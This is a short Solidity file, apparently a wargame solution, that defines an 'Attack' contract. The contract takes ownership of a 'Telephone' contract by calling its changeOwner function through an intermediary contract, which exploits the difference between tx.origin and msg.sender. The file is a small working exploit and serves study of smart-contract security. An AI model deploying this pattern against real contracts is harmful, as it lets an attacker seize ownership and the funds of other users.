// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './telephone.sol';

contract Attack {
    Telephone public victimContract;
    address public owner;

    constructor(address _victimContractAddr) public {
         victimContract = Telephone(_victimContractAddr);
        owner = msg.sender;

    }
    

    function AttackFxn (address _owner) public {

        owner =_owner;

        victimContract.changeOwner(_owner);


    }



}
